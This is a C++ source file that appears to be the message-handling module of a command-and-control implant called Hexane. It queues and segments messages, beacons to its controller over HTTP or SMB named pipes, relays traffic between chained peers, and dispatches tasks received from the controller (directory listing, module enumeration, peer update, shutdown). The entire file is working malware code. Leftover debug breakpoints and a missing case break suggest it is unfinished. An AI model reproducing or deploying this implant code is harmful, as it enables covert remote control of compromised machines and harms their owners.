#include <core/include/message.hpp>
namespace Message {

    RDATA_SECTION COMMAND_MAP CmdMap[] = {
        { .Id = CommandDir,         .Function = Commands::DirectoryList },
        { .Id = CommandMods,        .Function = Commands::ProcessModules },
        { .Id = CommandUpdatePeer,  .Function = Commands::UpdatePeer },
        { .Id = CommandShutdown,    .Function = Commands::Shutdown },
        { .Id = 0,                  .Function = nullptr }
    };

    BOOL PeekPID(PSTREAM Stream) {
        HEXANE

        UINT Pid = 0;
        x_memcpy(&Pid, Stream->Buffer, 4);

        if (x_memcmp(&Ctx->Session.PeerId, &Pid, 4) == 0) {
            return TRUE;
        }
        return FALSE;
    }

    VOID AddMessage(PSTREAM Outbound) {
        HEXANE

        __debugbreak();
        PSTREAM Head = Ctx->Transport.OutboundQueue;

        if (!Ctx->Transport.OutboundQueue) {
            Ctx->Transport.OutboundQueue = Outbound;

        } else {
            while (Head->Next) {
                Head = Head->Next;
            }

            Head->Next = Outbound;
        }
    }

    VOID ClearQueue() {
        HEXANE

        __debugbreak();
        PSTREAM Head = Ctx->Transport.OutboundQueue;
        PSTREAM Swap = { };
        PSTREAM Prev = { };

        if (!Head) {
            Ctx->Transport.OutboundQueue = nullptr;
            return_defer(ERROR_SUCCESS);
        }

        while (Head) {
            if (Head->Ready) {
                if (Prev) {
                    Prev->Next = Head->Next;

                } else {
                    Ctx->Transport.OutboundQueue = Head->Next;
                }

                Swap = Head;
                Head = Head->Next;
                Stream::DestroyStream(Swap);

            } else {
                Prev = Head;
                Head = Head->Next;
            }
        }

        defer:
    }

    VOID OutboundQueue(PSTREAM Outbound) {
        HEXANE

        if (!Outbound) {
            return_defer(ERROR_NO_DATA);
        }

        if (Outbound->Length > MESSAGE_MAX) {
            QueueSegments(B_PTR(Outbound->Buffer), Outbound->Length);
        } else {
            AddMessage(Outbound);
        }

        defer:
    }

    VOID QueueSegments(PBYTE Buffer, ULONG Length) {
        HEXANE

        PSTREAM Swap    = { };
        ULONG Index     = 1;
        ULONG Offset    = 0;
        ULONG PeerId    = 0;
        ULONG TaskId    = 0;
        ULONG cbSeg     = 0;
        ULONG nSegs     = (Length + MESSAGE_MAX - 1) / MESSAGE_MAX;

        while (Length > 0) {
            cbSeg   = (Length > MESSAGE_MAX - SEGMENT_HEADER_SIZE) ? MESSAGE_MAX - SEGMENT_HEADER_SIZE : Length;
            Swap    = (PSTREAM) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, cbSeg + SEGMENT_HEADER_SIZE);

            x_memcpy(&PeerId, Buffer, 4);
            x_memcpy(&TaskId, Buffer + 4, 4);

            Stream::PackDword(Swap, PeerId);
            Stream::PackDword(Swap, TaskId);
            Stream::PackDword(Swap, TypeSegment);

            Stream::PackDword(Swap, Index);
            Stream::PackDword(Swap, nSegs);
            Stream::PackDword(Swap, cbSeg);
            Stream::PackBytes(Swap, B_PTR(Buffer) + Offset, cbSeg);

            Index++;
            Length -= cbSeg;
            Offset += cbSeg;

            AddMessage(Swap);
        }
    }

    VOID MessageTransmit() {
        HEXANE

        PSTREAM Outbound    = Stream::CreateStreamWithHeaders(TypeResponse);
        PSTREAM Inbound     = { };
        PSTREAM Head        = { };
        PSTREAM Swap        = { };

        if (!Ctx->Transport.OutboundQueue->Buffer) {

#ifdef TRANSPORT_HTTP
            // Stream::PackDword(Outbound, 0);
            Stream::PackDword(Outbound, Ctx->Session.PeerId);
            Stream::PackDword(Outbound, Ctx->Session.CurrentTaskId);
            Stream::PackDword(Outbound, TypeTasking);
#else
            return_defer(ERROR_SUCCESS);
#endif
        }

        Head = Ctx->Transport.OutboundQueue;
        while (Head) {
            if ((Head->Length + Outbound->Length) > MESSAGE_MAX) {
                break;
            }

            if (Head->Buffer) {
                Stream::PackBytes(Outbound, B_PTR(Head->Buffer), Head->Length);
                Head->Ready = TRUE;
            }
            else {
                return_defer(ERROR_NO_DATA);
            }

            Head = Head->Next;
        }

#ifdef TRANSPORT_HTTP
        Http::HttpCallback(Outbound, &Inbound);
#endif
#ifdef TRANSPORT_PIPE
        Smb::PeerConnectEgress(Outbound, &Inbound);
#endif

        Stream::DestroyStream(Outbound);
        Outbound = nullptr;

        if (Inbound) {
            ClearQueue();

            if (PeekPID(Inbound)) {
                CommandDispatch(Inbound);
                Stream::DestroyStream(Inbound);

            } else {
                Swap = Inbound;
                Inbound = Outbound;
                Outbound = Swap;

                if (Ctx->Config.IngressPipename) {
                    Smb::PeerConnectIngress(Outbound, &Inbound);

                    if (Inbound) {
                        OutboundQueue(Inbound);
                    }
                }

                Stream::DestroyStream(Outbound);
            }
        } else {
            Head = Ctx->Transport.OutboundQueue;

            while (Head) {
                Head->Ready = FALSE;
                Head = Head->Next;
            }
        }

        defer:
    }

    VOID CommandDispatch (PSTREAM Inbound) {
        HEXANE

        PARSER Parser   = { };
        ULONG MsgType   = 0;
        ULONG CmdId     = 0;

        Parser::CreateParser(&Parser, B_PTR(Inbound->Buffer), Inbound->Length);

        Ctx->Session.PeerId         = Parser::UnpackDword(&Parser);
        Ctx->Session.CurrentTaskId  = Parser::UnpackDword(&Parser);
        MsgType                     = Parser::UnpackDword(&Parser);

        switch (MsgType) {

            case TypeCheckin: {
                Ctx->Session.Checkin = TRUE;
                break;
            }

            case TypeTasking: {
                CmdId = Parser::UnpackDword(&Parser);
                if (CmdId == CommandNoJob) {
                    break;
                }

                for (uint32_t FnCounter = 0;; FnCounter++) {
                    if (!CmdMap[FnCounter].Function) {
                        return_defer(ERROR_PROC_NOT_FOUND);
                    }

                    if (CmdMap[FnCounter].Id == CmdId) {
                        auto Cmd = CMD_SIGNATURE(Ctx->Base.Address + U_PTR(CmdMap[FnCounter].Function));
                        Cmd(&Parser);
                        break;
                    }
                }
            }
            default:
                break;
        }

        defer:
        Parser::DestroyParser(&Parser);
    }
}